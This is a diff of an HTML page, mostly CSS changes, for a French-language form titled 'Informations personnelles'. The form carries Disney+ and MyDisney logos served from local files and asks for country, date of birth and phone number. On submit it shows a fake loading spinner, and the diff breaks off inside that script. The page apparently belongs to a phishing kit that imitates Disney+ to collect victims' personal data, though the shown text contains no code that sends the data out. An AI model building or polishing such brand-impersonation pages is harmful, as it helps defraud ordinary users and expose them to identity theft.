@@ -11,54 +11,69 @@
       background: radial-gradient(circle at top, #003264 0%, #032541 100%);
       min-height: 100vh;
       display: flex;
-      flex-direction: column;
       align-items: center;
-    }
-
-    .logo {
-      margin-top: 40px;
-      width: 140px;
+      justify-content: center;
+      padding: 20px;
     }
 
     main {
       background-color: #fff;
-      color: #000;
-      max-width: 500px;
+      max-width: 420px;
       width: 100%;
-      border-radius: 20px;
+      border-radius: 24px;
       padding: 40px 30px;
-      margin: 30px 20px;
       box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+      text-align: center;
+    }
+
+    .logo {
+      width: 120px;
+      margin: 0 auto 20px;
+      display: block;
+    }
+
+    .my-disney {
+      width: 180px;
+      max-width: 100%;
+      margin: 10px auto 30px;
+      display: block;
     }
 
     h1 {
-      text-align: center;
       font-size: 1.6rem;
-      margin-bottom: 24px;
+      margin-bottom: 10px;
     }
 
     form {
       display: flex;
       flex-direction: column;
-      gap: 18px;
+      gap: 16px;
+      margin-top: 20px;
     }
 
     input, select {
-      padding: 14px;
+      width: 100%;
+      padding: 16px;
       font-size: 1rem;
-      border-radius: 6px;
       border: none;
-      background-color: #f0f0f0;
-      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.1);
+      border-radius: 8px;
+      background-color: #f2f2f2;
+      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
+      box-sizing: border-box;
+    }
+
+    input::placeholder,
+    select {
+      color: #999;
     }
 
     button {
-      margin-top: 10px;
-      padding: 14px;
+      width: 100%;
+      padding: 16px;
       background-color: #000;
       color: #fff;
-      font-weight: bold;
       font-size: 1rem;
+      font-weight: bold;
       border: none;
       border-radius: 999px;
       cursor: pointer;
@@ -66,22 +81,7 @@
     }
 
     button:hover {
-      background-color: #333;
-    }
-
-    @media (max-width: 480px) {
-      .logo {
-        width: 110px;
-        margin-top: 30px;
-      }
-
-      main {
-        padding: 30px 20px;
-      }
-
-      h1 {
-        font-size: 1.4rem;
-      }
+      background-color: #222;
     }
 
     /* Spinner Overlay */
@@ -108,11 +108,35 @@
     @keyframes spin {
       to { transform: rotate(360deg); }
     }
+
+    @media (max-width: 480px) {
+      main {
+        padding: 30px 20px;
+      }
+
+      h1 {
+        font-size: 1.4rem;
+      }
+
+      .logo {
+        width: 100px;
+        margin-bottom: 12px;
+      }
+
+      .my-disney {
+        width: 140px;
+        margin-bottom: 24px;
+      }
+    }
   </style>
 </head>
 <body>
 
+  <!-- Logo Disney+ -->
   <img src="Images/compose2.png" alt="Disney+" class="logo" />
+
+  <!-- Logo MyDisney -->
+  <img src="Images/Mydisney-logo.png" alt="MyDisney" class="my-disney" />
 
   <main>
     <h1>Informations personnelles</h1>
@@ -128,9 +152,8 @@
         <option value="FR">France</option>
         <option value="BE">Belgique</option>
         <option value="CH">Suisse</option>
-        <!-- Ajoute d'autres pays si nécessaire -->
       </select>
-      <input type="date" placeholder="Date de naissance" required />
+      <input type="date" required />
       <input type="tel" placeholder="Téléphone" required />
       <button type="submit">Continuer</button>
     </form>
@@ -144,7 +167,6 @@
   <script>
     document.getElementById("infoForm").addEventListener("submit", function(e) {
       e.preventDefault();
-
       document.getElementById("spinnerOverlay").style.display = "flex";
 
       setTimeout(() => {
